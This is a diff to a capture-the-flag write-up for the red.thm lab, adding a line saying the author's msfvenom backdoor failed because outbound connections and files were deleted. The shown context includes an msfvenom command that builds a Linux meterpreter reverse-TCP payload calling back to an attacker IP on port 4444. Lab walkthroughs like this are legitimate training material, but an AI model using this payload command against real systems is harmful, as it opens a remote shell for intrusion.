@@ -410,6 +410,7 @@ Connection to red.thm closed.
 - `/dev/shm` This is a temporary filesystem (stored in memory) that is often used for sharing data between processes.
  
 ## Crafting backdoor
+I decided to create a backdoor using msfvenom, hoping to establish a stable connection. However, in the end, it didn’t work as expected because all the outbound connections and files placed by the blue user got deleted.
 ```bash
 $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.23.42.147" LPORT=4444 -f elf > revshell.elf
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
